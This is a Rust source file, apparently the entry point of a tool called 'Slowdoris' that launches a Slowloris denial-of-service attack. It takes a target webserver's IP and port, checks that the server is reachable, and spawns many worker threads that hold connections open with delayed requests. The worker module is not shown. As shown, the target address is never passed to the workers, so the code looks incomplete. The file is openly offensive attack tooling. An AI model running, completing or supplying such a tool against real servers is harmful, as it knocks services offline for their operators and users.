mod worker;

use scoped_threadpool::Pool;
use worker::Worker;
use std::net::TcpStream;
use clap::Parser;

#[derive(Parser)]
#[clap(version = "1.0", author = "Michael V. <michaeljvanleeuwen@gmail.com>")]
struct Slowdoris {
    /// The IP address of the webserver
    ip: String,
    /// The port the webserver is running on
    port: String,
    /// How worker sockets to open
    num_workers: u8,
    /// Lower bound of request delay
    sleep_min: u8,
    /// Maximum bound of request delay
    sleep_max: u8,
}

fn main() {
    let args = Slowdoris::parse();

    if args.sleep_min >= args.sleep_max {
        panic!("sleep_min must be < sleep_max")
    }

    if TcpStream::connect(format!("{}:{}", args.ip, args.port)).is_err() {
        panic!("Connection failed. Is the server up?");
    }

    let mut pool = Pool::new(args.num_workers as u32);
    let mut num_workers = 0;
    pool.scoped(|scoped| {
        while num_workers < args.num_workers {
            if let Ok(mut worker) = Worker::new(num_workers, (args.sleep_min, args.sleep_max)) {
                println!("[slowloris_{:02}] Spawned.", num_workers);
                scoped.execute(move || {
                    worker.start();
                });
                num_workers += 1;
            }
        }
    });
}
